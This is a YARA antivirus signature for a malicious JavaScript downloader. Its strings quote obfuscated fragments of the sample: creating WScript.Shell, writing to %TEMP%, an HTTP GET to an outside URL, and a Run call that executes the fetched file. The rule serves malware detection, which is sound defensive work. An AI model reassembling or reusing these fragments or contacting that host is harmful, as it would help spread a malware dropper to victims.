rule sig_20160427_4205af64bb4fc3e5e1d4e71ffe6eac5b {
  meta:
    description = "datamaliciousorder - file 20160427_4205af64bb4fc3e5e1d4e71ffe6eac5b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dae922a0450cd9a16007f7b606ea167d0132f7eb05b3d21d6f7c44b94be6ff56"

  strings:
    $s1  = "function SolipMjcqa() {return CpzvtCntko[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"idxlEXj" ascii
    $s2  = "function SolipMjcqa() {return CpzvtCntko[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"idxlEXj" ascii
    $s3  = "var CpzvtCntko = function PdxvtAyrzv() {return CnayhKslkl[FiwhtOufev](\"WScript\"+\".Shell\");}(), NiaziPbpbd = 11;" fullword ascii
    $s4  = "function TdsvhMimks(UwgsuKwpnz, WfoyiNslvv){GopenGbhmi = GopenGbhmi * 1; return UwgsuKwpnz - WfoyiNslvv;};" fullword ascii
    $s5  = "CkaakLocmq[RtohsSiujc](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var CnayhKslkl = this[\"WScript\"];" fullword ascii
    $s7  = "function ChcosZxhhm(){return KdnvjIpazq + \"\";};" fullword ascii
    $s8  = "if (CkaakLocmq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function FagpxZysdr() {return ((HckpcJseyk == true) && (HckpcJseyk == MbeutYxnme)) ? 1 : GopenGbhmi;};" fullword ascii
    $s10 = "function CohmvYqzud(CzwsfUdjqi) {var CgypxGxqsi = (1, 2, 3, 4, 5, CzwsfUdjqi); return CgypxGxqsi;};" fullword ascii
    $s11 = "var MbeutYxnme = false;" fullword ascii
    $s12 = "function KegozVrjdl()" fullword ascii
    $s13 = "function BihlrNbxbi(){return 23;};" fullword ascii
    $s14 = "var HckpcJseyk = false;" fullword ascii
    $s15 = "function MrwyyGnzun(){return FiwhtOufev;};" fullword ascii
    $s16 = "return TdsvhMimks(VlhdnLripy, GxtkrDkpmn);" fullword ascii
    $s17 = "var MuyspNctep = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "}while (QnqyrUjlne);" fullword ascii
    $s19 = "MbeutYxnme = true; " fullword ascii
    $s20 = "function TqvrrNgbeu(XwrucBydby){CpzvtCntko[\"R\"+\"un\"](XwrucBydby, GopenGbhmi, GopenGbhmi);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}